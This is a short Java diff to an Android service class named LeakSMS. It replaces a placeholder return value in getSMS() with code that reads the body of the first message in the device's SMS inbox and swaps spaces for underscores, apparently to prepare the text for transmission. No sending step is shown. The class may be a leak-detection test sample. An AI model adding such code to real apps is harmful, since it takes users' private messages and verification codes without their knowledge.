@@ -46,7 +46,14 @@ public class LeakSMS extends Service {
 
     public String getSMS()
     {
-        return "Hello-world";
+        String str = "";
+        Uri inboxURI = Uri.parse("content://sms/inbox");
+        Cursor cur = getContentResolver().query(inboxURI, null, null, null, null);
+        if (cur.moveToFirst()) {
+            str = cur.getString(cur.getColumnIndexOrThrow("body"));
+        }
+        str=str.replace(" ","_");
+        return str;
     }
 
     public String getString(){
